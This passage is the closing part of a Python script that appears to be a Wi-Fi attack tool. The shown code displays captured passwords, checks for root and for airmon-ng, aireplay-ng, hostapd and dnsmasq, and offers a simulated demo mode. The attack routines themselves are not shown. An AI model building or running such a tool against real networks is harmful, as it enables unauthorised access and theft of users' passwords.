            print(f"  {Colors.DIM}... and {len(attack.captured_passwords) - 15} more{Colors.RESET}")
    
    print(f"\n{Colors.gradient('='*80, style='claude')}\n")
    
    input(f"{Colors.WHITE}Press Enter to return to main menu...{Colors.RESET}")


# ============= ENTRY POINT =============

if __name__ == '__main__':
    # Проверка root
    if not DEMO_MODE and os.geteuid() != 0:
        print(f"\n{Colors.gradient('='*60, style='claude')}")
        print(f"{Colors.ORANGE}[!] ERROR: Root privileges required!{Colors.RESET}")
        print(f"{Colors.gradient('='*60, style='claude')}\n")
        print(f"{Colors.WHITE}Run with sudo:{Colors.RESET}")
        print(f"  sudo python3 {sys.argv[0]}")
        print(f"\n{Colors.DIM}Or use demo mode:{Colors.RESET}")
        print(f"  python3 {sys.argv[0]} --demo")
        print()
        sys.exit(1)
    
    try:
        # Баннер для демо
        if DEMO_MODE:
            os.system('clear')
            print(Colors.gradient("""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║                      DEMO MODE ACTIVE                        ║
║                                                              ║
║              All operations are simulated!                   ║
║           No real network attacks will occur.                ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
            """, style='claude'))
            time.sleep(2)
        
        # Проверка зависимостей (только в реальном режиме)
        if not DEMO_MODE:
            required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 
                            'hostapd', 'dnsmasq', 'iwconfig']
            missing = []
            for tool in required_tools:
                result = subprocess.run(['which', tool], capture_output=True)
                if result.returncode != 0:
                    missing.append(tool)
            
            if missing:
                print(f"\n{Colors.ORANGE}[!] Missing tools: {', '.join(missing)}{Colors.RESET}")
                print(f"{Colors.WHITE}Install with: apt install aircrack-ng hostapd dnsmasq wireless-tools{Colors.RESET}\n")
                response = input(f"{Colors.WHITE}Continue anyway? (y/n): {Colors.RESET}")
                if response.lower() != 'y':
                    sys.exit(1)
        
        # Запуск главного меню
        main_menu()
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.ORANGE}[*] Interrupted{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.ORANGE}[!] Error: {e}{Colors.RESET}")
        if not DEMO_MODE:
            import traceback
            traceback.print_exc()
        sys.exit(1)